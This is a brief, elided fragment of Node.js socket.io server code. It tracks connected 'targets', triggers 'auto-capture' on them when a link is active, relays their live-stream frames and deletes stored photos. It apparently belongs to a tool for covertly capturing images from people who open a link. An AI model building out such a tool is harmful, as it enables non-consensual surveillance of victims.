...
io.on('connection', (socket) => {
    ...
    socket.on('user-ready', (data) => {
        ...
        io.emit('update-users-list', connectedTargets);
        if (isAutoCaptureOn && isLinkActive) socket.emit('start-auto-capture');
    });

    socket.on('live-stream-frame', (frameData) => {
        if (isLinkActive) io.emit('update-live-stream', { socketId: socket.id, frameData });
    });
    ...
    socket.on('delete-photo', (fileName) => {
        ...
        if (fs.existsSync(filePath)) {
            fs.unlink(filePath, (err) => { if (!err) console.log(`🗑️ Deleted file: ${fileName}`); });
        }
    });
});
